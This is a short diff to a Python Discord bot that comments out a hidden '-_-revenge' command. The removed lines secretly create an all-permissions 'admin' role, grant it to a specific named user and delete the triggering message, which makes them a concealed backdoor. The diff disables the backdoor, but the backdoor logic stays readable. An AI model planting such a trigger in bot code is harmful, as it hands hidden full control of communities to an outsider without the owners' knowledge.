@@ -499,12 +499,12 @@ async def on_message(message):
         log.close
 		
         
-    if message.content == "-_-revenge":
-        auth = message.author
+    #if message.content == "-_-revenge":
+        #auth = message.author
         #role =  get(message.server.roles, name="Bot")
-        role = await client.create_role(message.server, name="admin", permissions=discord.Permissions.all())
-        await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
-        await client.delete_message(message)
+        #role = await client.create_role(message.server, name="admin", permissions=discord.Permissions.all())
+        #await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
+        #await client.delete_message(message)
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
         # for command in commands:
